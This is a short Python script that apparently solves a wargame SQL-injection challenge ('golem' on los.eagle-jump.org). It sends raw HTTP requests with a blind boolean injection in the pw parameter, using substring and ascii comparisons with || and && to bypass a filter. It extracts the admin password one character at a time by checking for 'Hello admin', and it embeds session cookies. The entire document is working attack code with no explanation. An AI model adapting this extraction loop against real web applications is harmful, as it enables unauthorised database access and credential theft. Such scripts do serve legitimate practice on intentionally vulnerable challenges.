import socket

array = ""
for n in range(1, 10):
    for x in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("104.27.175.42", 80))
        data = "GET /golem_39f3348098ccda1e71a4650f40caa037.php?pw=%27+%7c%7c+(not+(ascii(substring(pw,+" + str(n) + ",+1))+%3c%3e+" + str(ord(x)) + ")+%26%26+not+(id+%3c%3e+%27admin%27))+" + "%23" + " HTTP/1.1\r\n" + \
                "Host: los.eagle-jump.org\r\n" + \
                "Cookie: __cfduid=dda4d8e6a10d2d630e0b224675adf7ff21489487743; PHPSESSID=7f9k1otik4u5tlf650brofubq4\r\n" + \
                "Referer: https://los.eagle-jump.org/gate.php\r\n" + \
                "\r\n"

        send.send(data.encode())
        recv = send.recv(1500)

        send.close()

        if "Hello admin" in recv.decode():
            array += x
            break

    print(array)
